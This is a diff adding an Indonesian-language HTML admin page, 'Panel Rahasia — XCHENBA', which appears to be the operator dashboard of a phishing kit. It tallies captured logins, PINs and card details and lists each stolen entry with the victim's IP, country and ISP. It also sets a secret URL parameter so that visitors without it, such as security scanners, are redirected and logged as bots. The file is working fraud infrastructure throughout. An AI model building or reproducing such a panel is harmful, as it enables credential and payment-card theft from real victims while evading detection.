@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Panel Rahasia — XCHENBA</title>
+    <script src="config.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Arial, sans-serif; }
+        body { background: #1a1a1f; min-height: 100vh; color: #fff; padding-bottom: 40px; }
+        .bg-logo { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); opacity: 0.06; pointer-events: none; }
+        .bg-logo img { max-width: 600px; width: 80vw; }
+        .konten { position: relative; z-index: 1; max-width: 1000px; margin: 0 auto; padding: 30px 20px; }
+        .kepala { text-align: center; margin-bottom: 30px; }
+        .kepala h1 { font-size: 26px; color: #e50914; margin-bottom: 5px; }
+        .kepala p { color: #999; font-size: 14px; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 15px; margin-bottom: 25px; }
+        .kartu { background: rgba(255,255,255,0.05); border-radius: 10px; padding: 20px; border: 1px solid rgba(255,255,255,0.1); text-align: center; }
+        .kartu h3 { font-size: 12px; color: #888; margin-bottom: 8px; text-transform: uppercase; }
+        .angka { font-size: 32px; font-weight: 700; }
+        .human { color: #00c853; }
+        .bot { color: #ff1744; }
+        .login { color: #00b0ff; }
+        .pin { color: #ffab00; }
+        .kartu-val { color: #9c27b0; }
+        .bagian { background: rgba(255,255,255,0.05); border-radius: 10px; padding: 25px; border: 1px solid rgba(255,255,255,0.1); margin-bottom: 20px; }
+        .bagian h2 { font-size: 16px; margin-bottom: 15px; padding-bottom: 10px; border-bottom: 1px solid rgba(255,255,255,0.1); }
+        .daftar { max-height: 400px; overflow-y: auto; }
+        .baris { padding: 12px 15px; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 13px; word-break: break-all; }
+        .label { display: inline-block; padding: 3px 8px; border-radius: 4px; font-size: 10px; font-weight: 600; margin-right: 8px; text-transform: uppercase; }
+        .label.human { background: rgba(0,200,83,0.2); color: #00c853; }
+        .label.bot { background: rgba(255,23,68,0.2); color: #ff1744; }
+        .label.login { background: rgba(0,176,255,0.2); color: #00b0ff; }
+        .label.pin { background: rgba(255,171,0,0.2); color: #ffab00; }
+        .label.kartu { background: rgba(156,39,176,0.2); color: #9c27b0; }
+        .tombol { padding: 10px 20px; border: none; border-radius: 6px; font-size: 14px; background: #0066CC; color: #fff; cursor: pointer; }
+        .tombol:hover { opacity: 0.9; }
+        .tombol.hijau { background: #00c853; margin-left: 10px; }
+        input { padding: 10px 14px; border: 1px solid #444; border-radius: 6px; background: #2a2a2f; color: #fff; font-size: 14px; flex: 1; }
+        .baris-input { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
+        .keterangan { font-size: 12px; color: #888; margin-top: 10px; }
+        .contoh { background: rgba(0,102,204,0.1); padding: 10px; border-radius: 6px; margin-top: 10px; font-family: monospace; font-size: 13px; word-break: break-all; color: #66b2ff; }
+        .berhasil { color: #00c853; margin-top: 12px; display: none; font-weight: 600; }
+        .info-kecil { margin-top: 25px; font-size: 12px; color: #666; text-align: center; }
+        .muat-ulang { text-align: center; margin-bottom: 15px; }
+    </style>
+</head>
+<body>
+
+<div class="bg-logo"><img src="assets/img/xchenba.png" alt="XCHENBA"></div>
+<div class="konten">
+    <div class="kepala">
+        <h1>🛡️ PANEL RAHASIA — XCHENBA</h1>
+        <p>Ubah parameter kapan saja — langsung berlaku</p>
+    </div>
+
+    <!-- PENGATURAN PARAMETER -->
+    <div class="bagian">
+        <h2>⚙️ PENGATURAN PARAMETER AKSES</h2>
+        <label style="font-size:14px; color:#ccc; margin-bottom:8px; display:block;">Nilai Parameter Saat Ini:</label>
+        <div class="baris-input">
+            <input type="text" id="inputParameter" placeholder="Contoh: =verifikasi-akun" style="flex:2;">
+            <button class="tombol hijau" id="btnSimpanParam">✅ Simpan</button>
+        </div>
+        <p class="keterangan">Tautan akses:</p>
+        <p class="contoh" id="contohTautan"></p>
+        <p class="berhasil" id="pesanBerhasil">✅ Parameter berhasil diperbarui!</p>
+    </div>
+
+    <!-- ANGKA RINGKASAN -->
+    <div class="grid">
+        <div class="kartu"><h3>✅ HUMAN</h3><div class="angka human" id="jmlHuman">0</div></div>
+        <div class="kartu"><h3>🤖 BOT</h3><div class="angka bot" id="jmlBot">0</div></div>
+        <div class="kartu"><h3>📧 LOGIN</h3><div class="angka login" id="jmlLogin">0</div></div>
+        <div class="kartu"><h3>🔑 PIN</h3><div class="angka pin" id="jmlPin">0</div></div>
+        <div class="kartu"><h3>💳 KARTU</h3><div class="angka kartu-val" id="jmlKartu">0</div></div>
+    </div>
+
+    <!-- DAFTAR RIWAYAT -->
+    <div class="bagian">
+        <h2>📋 SEMUA RIWAYAT</h2>
+        <div class="muat-ulang">
+            <button class="tombol" onclick="muatData()">🔄 Segarkan Data</button>
+        </div>
+        <div class="daftar" id="daftarRiwayat">
+            <div style="color:#777;padding:30px;text-align:center;">Memuat data...</div>
+        </div>
+    </div>
+
+    <div class="info-kecil">
+        Tanpa parameter yang cocok → Dialihkan & Tercatat sebagai Bot
+    </div>
+</div>
+
+<script>
+let paramSekarang = '=aktif';
+const asalWeb = window.location.origin;
+
+function perbaruiContoh() {
+  const nilai = document.getElementById('inputParameter').value.trim() || paramSekarang;
+  document.getElementById('contohTautan').textContent = `${asalWeb}/?${nilai}`;
+}
+
+async function muatData() {
+  const el = document.getElementById('daftarRiwayat');
+  el.innerHTML = '<div style="color:#888;padding:30px;text-align:center;">Memuat...</div>';
+
+  try {
+    const res = await fetch('/api/data');
+    if (!res.ok) throw new Error('Server tidak merespons');
+    
+    const data = await res.json();
+
+    paramSekarang = data.ringkasan.parameter || '=aktif';
+    document.getElementById('inputParameter').value = paramSekarang;
+    perbaruiContoh();
+
+    document.getElementById('jmlHuman').textContent = data.ringkasan.human;
+    document.getElementById('jmlBot').textContent = data.ringkasan.bot;
+    document.getElementById('jmlLogin').textContent = data.ringkasan.login;
+    document.getElementById('jmlPin').textContent = data.ringkasan.pin;
+    document.getElementById('jmlKartu').textContent = data.ringkasan.kartu;
+
+    if (data.daftar.length === 0) {
+      el.innerHTML = '<div style="color:#777;padding:30px;text-align:center;">Belum ada data...</div>';
+    } else {
+      el.innerHTML = data.daftar.map(item => `
+        <div class="baris">
+          <span class="label ${item.tipe || item.kategori}">${item.tipe || item.kategori}</span>
+          <span>${item.data}</span>
+          <div style="font-size:11px;color:#555;margin-top:4px;">
+            ${item.created_at}<br>
+            IP: ${item.ip || '-'} • ${item.negara || '-'} • ${item.isp || '-'}
+          </div>
+        </div>
+      `).join('');
+    }
+  } catch (e) {
+    el.innerHTML = `<div style="color:#ff6666;padding:30px;text-align:center;">Gagal terhubung: ${e.message}</div>`;
+  }
+}
+
+async function simpanParameter() {
+  const nilai = document.getElementById('inputParameter').value.trim();
+  if (!nilai) {
+    alert('Masukkan nilai parameter!');
+    return;
+  }
+
+  try {
+    const res = await fetch('/api/atur-parameter', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ parameter: nilai })
+    });
+    
+    if (!res.ok) throw new Error('Gagal menyimpan');
+    
+    const hasil = await res.json();
+    
+    if (hasil.ok) {
+      paramSekarang = hasil.parameter;
+      perbaruiContoh();
+      const pesan = document.getElementById('pesanBerhasil');
+      pesan.style.display = 'block';
+      setTimeout(() => pesan.style.display = 'none', 3000);
+    } else {
+      alert('Gagal: ' + (hasil.pesan || 'Tidak diketahui'));
+    }
+  } catch (e) {
+    alert('Kesalahan: ' + e.message + '\nPastikan server.js sudah diperbarui!');
+  }
+}
+
+document.getElementById('btnSimpanParam').addEventListener('click', simpanParameter);
+document.getElementById('inputParameter').addEventListener('input', perbaruiContoh);
+document.addEventListener('DOMContentLoaded', muatData);
+</script>
+
+</body>
+</html>
